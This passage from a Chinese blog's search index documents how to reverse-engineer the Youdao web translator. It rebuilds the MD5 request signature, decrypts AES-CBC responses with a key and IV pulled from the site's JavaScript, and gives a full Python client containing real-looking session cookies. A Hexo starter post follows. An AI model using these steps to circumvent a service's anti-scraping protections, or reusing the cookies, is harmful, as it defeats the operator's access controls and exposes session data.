src="https://s21.ax1x.com/2024/11/23/pAf0tJI.png" alt="pAf0tJI.png"></a><br>进入xhr请求函数（随便进入一个都可以）<br>要在<strong>作用域</strong>中的 params参数中去看 发包发出去了什么变量 发现sign已经生成<a href="https://imgse.com/i/pAf0dQf"><img src="https://s21.ax1x.com/2024/11/23/pAf0dQf.png" alt="pAf0dQf.png"></a><br>然后去调用堆栈中一个个函数去找 观察哪一个生成了sign<br>这里的I函数没有sign，而上一个I是有sign值的，说明是在这一步去进行了sign值生成 所以重点分析这里<br><a href="https://imgse.com/i/pAf00OS"><img src="https://s21.ax1x.com/2024/11/23/pAf00OS.png" alt="pAf00OS.png"></a><a href="https://imgse.com/i/pAf0Deg"><img src="https://s21.ax1x.com/2024/11/23/pAf0Deg.png" alt="pAf0Deg.png"></a><br>给I跟下面的匿名打上断点 去分析两者夹着的代码，因为此时sign在t变量里面 所以去看含t的就函数 发现K(t)非常可疑<br><a href="https://imgse.com/i/pAfBRNd"><img src="https://s21.ax1x.com/2024/11/23/pAfBRNd.png" alt="pAfBRNd.png"></a><br>控制台用一下<br><a href="https://imgse.com/i/pAf0wy8"><img src="https://s21.ax1x.com/2024/11/23/pAf0wy8.png" alt="pAf0wy8.png"></a><br>接下来分析k(t)是如何实现的，在k(t)前面去断点调试<a href="https://imgse.com/i/pAf0rwQ"><img src="https://s21.ax1x.com/2024/11/23/pAf0rwQ.png" alt="pAf0rwQ.png"></a></p><p>这里我们很明显发现sign值就是k生成显示的，其值是由S函数生成的，往上一看就是S的调用，它又调用了一个匿名函数，是md5算法，加密的字符串就是简单的拼接这个字符串 </p><p><code>return _(`client=$&#123;d&#125;&amp;mysticTime=$&#123;e&#125;&amp;product=$&#123;u&#125;&amp;key=$&#123;t&#125;`)</code><br><a href="https://imgse.com/i/pAf0YFA"><img src="https://s21.ax1x.com/2024/11/23/pAf0YFA.png" alt="pAf0YFA.png"></a></p><h3 id="逻辑："><a href="#逻辑：" class="headerlink" title="逻辑："></a>逻辑：</h3><p>k⽣成了Sign<br>k返回的是⼀个data字典<br>字典⾥的sign值是由S函数⽣成的<br>S函数调⽤了_匿名函数<br>且_函数调⽤md5加密了内容⽣成sign值</p><p>其中d就是<code>fanyideskweb</code> <code>product</code>就是<code>webfanyi</code> key是个定值，具体就是从多次分析中发现，key没有变(一直取e)<br>是这个值asdjnjfenknafdfsdfsd ，最后我们需要看一下这个mysticTime的获取，发现它就是传入的a，a是const a &#x3D; (new Date).getTime(); 是获取当前时间</p><p>然后简单用python代码复现一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">e</span>):</span><br><span class="line">    d=<span class="string">&#x27;fanyideskweb&#x27;</span></span><br><span class="line">    u = <span class="string">&#x27;webfanyi&#x27;</span></span><br><span class="line">    t = <span class="string">&#x27;fsdsogkndfokasodnaso&#x27;</span></span><br><span class="line">    <span class="comment"># e = str(int(time.time()*1000))</span></span><br><span class="line">    payload = <span class="string">f&quot;client=<span class="subst">&#123;d&#125;</span>&amp;mysticTime=<span class="subst">&#123;e&#125;</span>&amp;product=<span class="subst">&#123;u&#125;</span>&amp;key=<span class="subst">&#123;t&#125;</span>&quot;</span></span><br><span class="line">    m = hashlib.md5() <span class="comment"># 创建md5对象</span></span><br><span class="line">    m.update(payload.encode()) <span class="comment"># 对payload进行编码</span></span><br><span class="line">    <span class="keyword">return</span> m.hexdigest() <span class="comment"># 返回md5值</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h4><p>这段代码使用了Python的f-string（格式化字符串字面量）来构建一个查询字符串，它与JavaScript模板字符串的作用类似。f-string允许你在字符串中直接嵌入表达式，并且会自动将表达式的值替换到字符串中。这里的<code>d</code>、<code>e</code>、<code>u</code>、<code>t</code>是变量，它们将被替换为它们的值。<br>这里的e为传入的时间，自此，将sign值和mysticTime替换成我们的值，就可以正确获取响应了，但是响应是加密的，还需要解密</p><h2 id="响应逆向分析"><a href="#响应逆向分析" class="headerlink" title="响应逆向分析"></a>响应逆向分析</h2><p>我们刚刚通过I函数的位置找到了获取sign值的函数，那么在此附近可以看一下解密的函数，因为猜测拿到响应就解密<br>在 下面（e，t，a）打上断电后单步调试F10  同时还发现下面有个feedback（反馈）函数中也有（e，t，a） 还有 解密，接下来就去确定变量值<br><a href="https://imgse.com/i/pAfBh9I"><img src="https://s21.ax1x.com/2024/11/23/pAfBh9I.png" alt="pAfBh9I.png"></a><br>发现此处有个些带key的变量 调试显示o 为“fsdsogkndfokasodnaso”   -&gt;后面发现这个是key<br><a href="https://imgse.com/i/pAfB43t"><img src="https://s21.ax1x.com/2024/11/23/pAfB43t.png" alt="pAfB43t.png"></a><br>然后继续调试有个e字典出现 带着<code>data：&quot;Z21kD9ZK1ke6ugku2ccWu-MeDWh3z252xRTQv-wZ6jddVo3tJLe7gIXz4PyxGl73nSfLAADyElSjjvrYdCvEP4pfohVVEX1DxoI0yhm36ytQNvu-WLU94qULZQ72aml6JKK7ArS9fJXAcsG7ufBIE0gd6fbnhFcsGmdXspZe-8whVFbRB_8Fc9JlMHh8DDXnskDhGfEscN_rfi-A-AHB3F9Vets82vIYpkGNaJOft_JA-m5cGEjo-UNRDDpkTz_NIAvo5PbATpkh7PSna2tHcE6Hou9GBtPLB67vjScwplB96-zqZKXJJEzU5HGF0oPDY_weAkXArzXyGLBPXFCnn_IWJDkGD4vqBQQAh2n52f48GD_cb-PSCT_8b-ESsKUI9NJa11XsdaUZxAc8TzrYnXwdcQbtl_kZGKhS6_rCtuNEBouA_lvM2CbS7TTtV2U4zVmJKpp-c6nt3yZePK3Av01GWn1pH_3sZbaPEx8DUjSbdp4i4iK-Mj4p2HPoph67DR7B9MFETYku_28SgP9xsKRRvFH4aHBHESWX4FDbwaU=&quot;</code><br>像是base64编码-&gt;发给ai后：您提供的字符串看起来像是一个Base64编码的字符串，但是包含了URL安全的字符（<code>-</code> 和 <code>_</code>）。在Python中，您可以使用<code>base64</code>模块来解码这样的字符串<br><a href="https://imgse.com/i/pAfB5gP"><img src="https://s21.ax1x.com/2024/11/23/pAfB5gP.png" alt="pAfB5gP.png"></a><br><a href="https://imgse.com/i/pAfBIjf"><img src="https://s21.ax1x.com/2024/11/23/pAfBIjf.png" alt="pAfBIjf.png"></a><br>之后e的传给了o<br><a href="https://imgse.com/i/pAfB7DS"><img src="https://s21.ax1x.com/2024/11/23/pAfB7DS.png" alt="pAfB7DS.png"></a></p><p>之后来到关键解密处 打上断点一步步调试：发现e还是data值<br>发现 <code>t=&quot;ydsecret://query/key/B*RGygVywfNBwpmBaZg*WT7SIOUP2T0C9WHMZN39j^DAdaZhAnxvGcCY6VYFwnHl&quot;</code><br><code>a = &quot;ydsecret://query/iv/C@lZe2YzHtZ2CYgaXKSVfsb7Y4QWHjITPPZ0nQp87fBeJ!Iv6v^6fvi2WN@bYpJ4&quot;</code><br>两个变量 是个不变的定值 然后用T()函数进行加工后赋值给o和n<br><a href="https://imgse.com/i/pAfBHHg"><img src="https://s21.ax1x.com/2024/11/23/pAfBHHg.png" alt="pAfBHHg.png"></a><br>T（）函数在生成sign时候见过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function T(e) &#123;</span><br><span class="line">    return i.createHash(&quot;md5&quot;).update(e).digest()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="贴一个ai解释："><a href="#贴一个ai解释：" class="headerlink" title="贴一个ai解释："></a>贴一个ai解释：</h4><p>您提供的代码片段看起来像是JavaScript中用于生成MD5哈希值的代码。这段代码使用了Node.js的<code>crypto</code>模块来创建一个MD5哈希。下面是这段代码的解释：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="comment">// 创建一个MD5哈希实例</span></span><br><span class="line"><span class="keyword">const</span> hash = crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>);</span><br><span class="line"><span class="comment">// 更新哈希实例，添加需要哈希的数据</span></span><br><span class="line">hash.<span class="title function_">update</span>(e);</span><br><span class="line"><span class="comment">// 完成哈希计算并返回结果</span></span><br><span class="line"><span class="keyword">const</span> result = hash.<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里的<code>e</code>应该是一个字符串或者是一个Buffer对象，代表你想要生成MD5哈希的数据。<code>update</code>方法用于添加数据到哈希对象中，而<code>digest</code>方法则用于计算最终的哈希值。<code>digest</code>方法的参数<code>&#39;hex&#39;</code>表示返回的哈希值应该是十六进制字符串格式。</p><h4 id="所以对加密的总结是："><a href="#所以对加密的总结是：" class="headerlink" title="所以对加密的总结是："></a>所以对加密的总结是：</h4><p>加密模式是AES-CBC 。 o，n 为一个密钥一个初始化向量，响应文本给的是密文<br>以十六进制去运算的 输出是utf-8</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decodeResponse</span>(<span class="params">response</span>):</span><br><span class="line">        <span class="comment">#响应文本为base64编码过的</span></span><br><span class="line">        base64_encode_data = response.text.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;+&#x27;</span>).replace(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        <span class="comment"># 将URL安全的Base64字符转换为标准Base64字符</span></span><br><span class="line">        base64_decode_data = base64.b64decode(base64_encode_data)</span><br><span class="line">        <span class="comment">#print(base64_decode_data)</span></span><br><span class="line">        t=<span class="string">&#x27;ydsecret://query/key/B*RGygVywfNBwpmBaZg*WT7SIOUP2T0C9WHMZN39j^DAdaZhAnxvGcCY6VYFwnHl&#x27;</span></span><br><span class="line">        a=<span class="string">&#x27;ydsecret://query/iv/C@lZe2YzHtZ2CYgaXKSVfsb7Y4QWHjITPPZ0nQp87fBeJ!Iv6v^6fvi2WN@bYpJ4&#x27;</span></span><br><span class="line">        <span class="comment">#这样三步后返回十六进制哈希值</span></span><br><span class="line">        </span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        m.update(t.encode()) </span><br><span class="line">        n=hashlib.md5()</span><br><span class="line">        n.update(a.encode()) </span><br><span class="line">key = m.digest() <span class="comment">#网页中的o </span></span><br><span class="line">iv = n.digest() <span class="comment">#网页中的n</span></span><br><span class="line">        <span class="comment">#创建AES对象 使用CBC模式</span></span><br><span class="line">        aes = AES.new(key, AES.MODE_CBC, iv) </span><br><span class="line">        data = aes.decrypt(base64_decode_data) <span class="comment">#解密</span></span><br><span class="line">        data= unpad(data,<span class="number">16</span>) <span class="comment">#去除PKCS7填充，确保数据长度是16的倍数</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#将解密后的字节数据解码为UTF-8格式的字符串</span></span><br><span class="line">        <span class="comment">#将字符串解析为JSON对象</span></span><br><span class="line">        res=json.loads(data.decode()) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;中文结果:&#x27;</span>,res[<span class="string">&#x27;translateResult&#x27;</span>][<span class="number">0</span>][<span class="number">0</span>][<span class="string">&#x27;tgt&#x27;</span>])</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;翻译未成功&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="自身不懂的点的解释"><a href="#自身不懂的点的解释" class="headerlink" title="自身不懂的点的解释"></a>自身不懂的点的解释</h4><ol><li><code>unpad</code>函数是用于去除PKCS7填充的函数。在加密数据时，为了满足某些加密算法对数据长度的要求（比如AES要求数据长度必须是块大小的整数倍），通常会添加一些填充字节。PKCS7是一种常用的填充方案，它规定填充的字节的值等于填充的长度。<br><code>unpad</code>函数的作用就是从解密后的数据中去除这些填充字节，恢复原始数据。在Python的<code>Crypto.Util.Padding</code>模块中提供了<code>unpad</code>函数，可以很方便地去除PKCS7填充</li><li>res[‘translateResult’] 是最外层的列表<br> [0] 获取第一组翻译结果<br> [0] 获取第一条翻译<br> [‘tgt’] 获取目标语言(target)的翻译文本</li></ol><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">e</span>):</span><br><span class="line">    d=<span class="string">&#x27;fanyideskweb&#x27;</span></span><br><span class="line">    u = <span class="string">&#x27;webfanyi&#x27;</span></span><br><span class="line">    t = <span class="string">&#x27;fsdsogkndfokasodnaso&#x27;</span></span><br><span class="line">    <span class="comment"># e = str(int(time.time()*1000))</span></span><br><span class="line">    payload = <span class="string">f&quot;client=<span class="subst">&#123;d&#125;</span>&amp;mysticTime=<span class="subst">&#123;e&#125;</span>&amp;product=<span class="subst">&#123;u&#125;</span>&amp;key=<span class="subst">&#123;t&#125;</span>&quot;</span></span><br><span class="line">    m = hashlib.md5() <span class="comment"># 创建md5对象</span></span><br><span class="line">    m.update(payload.encode()) <span class="comment"># 对payload进行编码</span></span><br><span class="line">    <span class="keyword">return</span> m.hexdigest() <span class="comment"># 返回md5值</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;OUTFOX_SEARCH_USER_ID&#x27;</span>: <span class="string">&#x27;1760702234@221.2.164.11&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;OUTFOX_SEARCH_USER_ID_NCOO&#x27;</span>: <span class="string">&#x27;1426232579.0837824&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DICT_DOCTRANS_SESSION_ID&#x27;</span>: <span class="string">&#x27;MzQ3NDhmNmMtZGEyYy00OWRjLWJjOTMtZWU2ODFmMmExYzk2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_uetsid&#x27;</span>: <span class="string">&#x27;161449f0a69a11ef93f8d9d82f396997&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_uetvid&#x27;</span>: <span class="string">&#x27;16144de0a69a11ef9082e976e1786dda&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/plain, */*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="comment"># &#x27;Cookie&#x27;: &#x27;OUTFOX_SEARCH_USER_ID=1760702234@221.2.164.11; OUTFOX_SEARCH_USER_ID_NCOO=1426232579.0837824; DICT_DOCTRANS_SESSION_ID=MzQ3NDhmNmMtZGEyYy00OWRjLWJjOTMtZWU2ODFmMmExYzk2; _uetsid=161449f0a69a11ef93f8d9d82f396997; _uetvid=16144de0a69a11ef9082e976e1786dda&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;https://fanyi.youdao.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://fanyi.youdao.com/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-site&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua&#x27;</span>: <span class="string">&#x27;&quot;Google Chrome&quot;;v=&quot;131&quot;, &quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-platform&#x27;</span>: <span class="string">&#x27;&quot;macOS&quot;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">t = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time()*<span class="number">1000</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decodeResponse</span>(<span class="params">response</span>):</span><br><span class="line">        <span class="comment">#响应文本为base64编码过的</span></span><br><span class="line">        base64_encode_data = response.text.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;+&#x27;</span>).replace(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        <span class="comment"># 将URL安全的Base64字符转换为标准Base64字符</span></span><br><span class="line">        base64_decode_data = base64.b64decode(base64_encode_data)</span><br><span class="line">        <span class="comment">#print(base64_decode_data)</span></span><br><span class="line">        t=<span class="string">&#x27;ydsecret://query/key/B*RGygVywfNBwpmBaZg*WT7SIOUP2T0C9WHMZN39j^DAdaZhAnxvGcCY6VYFwnHl&#x27;</span></span><br><span class="line">        a=<span class="string">&#x27;ydsecret://query/iv/C@lZe2YzHtZ2CYgaXKSVfsb7Y4QWHjITPPZ0nQp87fBeJ!Iv6v^6fvi2WN@bYpJ4&#x27;</span></span><br><span class="line">        <span class="comment">#这样三步后返回十六进制哈希值</span></span><br><span class="line">        </span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        m.update(t.encode()) </span><br><span class="line">        n=hashlib.md5()</span><br><span class="line">        n.update(a.encode()) </span><br><span class="line">        key = m.digest() <span class="comment">#网页中的o </span></span><br><span class="line">        iv = n.digest() <span class="comment">#网页中的n</span></span><br><span class="line">        <span class="comment">#创建AES对象 使用CBC模式</span></span><br><span class="line">        aes = AES.new(key, AES.MODE_CBC, iv) </span><br><span class="line">        data = aes.decrypt(base64_decode_data) <span class="comment">#解密</span></span><br><span class="line">        data= unpad(data,<span class="number">16</span>) <span class="comment">#去除PKCS7填充，确保数据长度是16的倍数</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#将解密后的字节数据解码为UTF-8格式的字符串</span></span><br><span class="line">        <span class="comment">#将字符串解析为JSON对象</span></span><br><span class="line">        res=json.loads(data.decode()) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;中文结果:&#x27;</span>,res[<span class="string">&#x27;translateResult&#x27;</span>][<span class="number">0</span>][<span class="number">0</span>][<span class="string">&#x27;tgt&#x27;</span>])</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;翻译未成功&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    word = <span class="built_in">input</span>(<span class="string">&#x27;请输入要翻译的词：&#x27;</span>)</span><br><span class="line">    data = &#123;</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>: word,</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;auto&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;useTerm&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dictResult&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;keyid&#x27;</span>: <span class="string">&#x27;webfanyi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sign&#x27;</span>: getSign(t),</span><br><span class="line">    <span class="string">&#x27;client&#x27;</span>: <span class="string">&#x27;fanyideskweb&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;product&#x27;</span>: <span class="string">&#x27;webfanyi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;appVersion&#x27;</span>: <span class="string">&#x27;1.0.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vendor&#x27;</span>: <span class="string">&#x27;web&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pointParam&#x27;</span>: <span class="string">&#x27;client,mysticTime,product&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mysticTime&#x27;</span>: t,</span><br><span class="line">    <span class="string">&#x27;keyfrom&#x27;</span>: <span class="string">&#x27;fanyi.web&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mid&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;screen&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;model&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;network&#x27;</span>: <span class="string">&#x27;wifi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;abtest&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yduuid&#x27;</span>: <span class="string">&#x27;abcdefg&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(<span class="string">&#x27;https://dict.youdao.com/webtranslate&#x27;</span>, cookies=cookies, headers=headers, data=data)</span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line">    decodeResponse(response)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/post/20250201222237.html"/>
      <url>/post/20250201222237.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
